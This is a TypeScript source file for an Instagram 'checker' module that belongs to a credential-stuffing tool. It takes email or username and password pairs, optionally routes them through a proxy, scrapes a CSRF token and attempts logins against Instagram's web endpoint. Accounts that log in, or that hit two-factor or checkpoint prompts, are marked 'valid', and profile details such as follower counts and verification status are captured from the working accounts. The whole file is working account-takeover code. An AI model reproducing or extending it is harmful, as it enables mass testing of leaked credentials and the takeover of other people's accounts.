import { BaseChecker } from './base';
import { CheckResult } from '@/types';

export class InstagramChecker extends BaseChecker {
  constructor(proxy?: any, timeout?: number) {
    super('instagram', proxy, timeout);
  }

  async check(credential: string, password: string): Promise<CheckResult> {
    return this.checkWithFallback(
      credential,
      password,
      this.checkWithCredential.bind(this),
      // Instagram accepts both email and username, try the opposite format
      this.isEmail(credential) ? this.checkAsUsername.bind(this) : this.checkAsEmail.bind(this)
    );
  }

  private async checkWithCredential(credential: string, password: string): Promise<CheckResult> {
    try {
      // Get Instagram login page to extract CSRF token
      const loginPageResponse = await this.client.get('https://www.instagram.com/accounts/login/', {
        headers: {
          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        },
      });

      // Extract CSRF token
      const csrfTokenMatch = loginPageResponse.data.match(/csrf_token["']\s*:\s*["']([^"']+)/);
      const csrfToken = csrfTokenMatch?.[1] || 'missing';

      // Extract additional required parameters
      const rolloutHashMatch = loginPageResponse.data.match(/rollout_hash["']\s*:\s*["']([^"']+)/);
      const rolloutHash = rolloutHashMatch?.[1] || '';

      // Instagram login attempt
      const loginData = {
        username: credential,
        enc_password: `#PWD_INSTAGRAM_BROWSER:0:${Date.now()}:${password}`,
        queryParams: '{}',
        optIntoOneTap: 'false',
        stopDeletionNonce: '',
        trustedDeviceRecords: '{}',
      };

      const loginResponse = await this.client.post(
        'https://www.instagram.com/accounts/login/ajax/',
        loginData,
        {
          headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-CSRFToken': csrfToken,
            'X-Instagram-AJAX': rolloutHash,
            'X-Requested-With': 'XMLHttpRequest',
            'Referer': 'https://www.instagram.com/accounts/login/',
          },
        }
      );

      // Check for successful authentication
      if (loginResponse.data?.authenticated === true) {
        const capture = await this.getAccountDetails(loginResponse.data.userId);
        return this.createResult(credential, password, 'instagram', 'valid', capture);
      }

      // Check for 2FA requirement
      if (loginResponse.data?.two_factor_required) {
        return this.createResult(credential, password, 'instagram', 'valid', {
          twoFactorEnabled: true,
        });
      }

      // Check for checkpoint (suspicious activity)
      if (loginResponse.data?.checkpoint_url) {
        return this.createResult(credential, password, 'instagram', 'valid', {
          checkpoint: true,
        });
      }

      return this.createResult(credential, password, 'instagram', 'invalid');
    } catch (error: any) {
      return this.handleError(error, credential, password);
    }
  }

  private async checkAsUsername(credential: string, password: string): Promise<CheckResult> {
    // If email failed, try the same credential as username (Instagram accepts both)
    return this.checkWithCredential(credential, password);
  }

  private async checkAsEmail(credential: string, password: string): Promise<CheckResult> {
    // If username failed, try as email
    return this.checkWithCredential(credential, password);
  }

  private async getAccountDetails(userId: string) {
    try {
      // Get user profile information
      const response = await this.client.get(
        `https://i.instagram.com/api/v1/users/${userId}/info/`,
        {
          headers: {
            'Accept': 'application/json',
          },
        }
      );

      const user = response.data?.user;
      
      return {
        username: user?.username,
        displayName: user?.full_name,
        followers: user?.follower_count,
        following: user?.following_count,
        posts: user?.media_count,
        verified: user?.is_verified,
        isPremium: user?.is_business,
        bio: user?.biography,
        profilePicture: user?.profile_pic_url,
        isPrivate: user?.is_private,
        userId: userId,
      };
    } catch {
      return {
        userId: userId,
      };
    }
  }
}
